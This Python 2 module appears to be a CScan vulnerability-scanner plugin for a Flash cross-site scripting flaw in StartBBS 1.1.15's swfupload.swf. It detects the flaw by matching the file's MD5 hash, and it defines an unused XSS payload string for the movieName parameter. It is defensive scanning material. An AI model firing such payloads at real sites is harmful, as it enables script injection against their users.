# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import hashlib

class Vuln(ABVuln):
    vuln_id = 'StartBBS_0001' # 平台漏洞编号，留空
    name = 'StartBBS /swfupload.swf 跨站脚本漏洞' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-09-22'  # 漏洞公布时间
    desc = '''
        StartBBS 1.1.15.* /plugins/kindeditor/plugins/multiimage/images/swfupload.swf Flash XSS.
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = 'StartBBS'  # 漏洞应用名称
    product_version = '1.1.15.*'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '535aee4b-5de8-4e6a-b06e-0519e129c277'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-05' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            
            flash_md5 = "3a1c6cc728dddc258091a601f28a9c12"  
            file_path = "/plugins/kindeditor/plugins/multiimage/images/swfupload.swf"

            verify_url = '{target}'.format(target=self.target)+file_path
            xss_poc = '?movieName="]%29;}catch%28e%29{}if%28!self.a%29self.a=!alert%281%29;//'
            request = urllib2.Request(verify_url)  
            response = urllib2.urlopen(request)  
            content = response.read()  
            md5_value = hashlib.md5(content).hexdigest()
            if md5_value in flash_md5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()
        

if __name__ == '__main__':
    Poc().run()
